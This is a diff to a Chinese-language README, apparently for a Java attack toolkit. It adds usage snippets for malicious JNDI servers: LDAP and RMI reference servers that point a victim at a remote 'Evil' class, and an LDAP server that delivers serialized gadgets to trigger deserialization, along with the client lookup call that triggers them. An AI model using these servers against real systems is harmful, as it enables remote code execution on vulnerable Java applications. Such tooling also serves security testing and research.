@@ -157,15 +157,33 @@ new AgentLoader("这里填main方法所在类的全限定名").loadAgent("agent�
 
 ## JNDI Server
 
-- LDAPServer
+- LDAPRefServer
 
-  启动一个恶意LDAP服务器
-
-  使用方式
+  低版本JNDI，ref方式，ldap路线
 
   ```
-  new LDAPServer(port,bytes).start();
+  new LDAPRefServer(7777,"http://127.0.0.1:8000/#Evil").start();
   ```
+
+- RMIRefServer
+
+  低版本JNDI，ref方式，rmi路线
+
+- LDAPSerializedDataServer
+
+  打高版本JNDI触发反序列化
+
+  ```
+  new LDAPSerializedDataServer(7777,Util.serialize(new Bean())).start();
+  ```
+
+  客户端连接方式：
+
+  ```
+  new InitialContext().lookup("ldap://ip:7777/anything_is_ok");
+  ```
+
+  
 
   
 
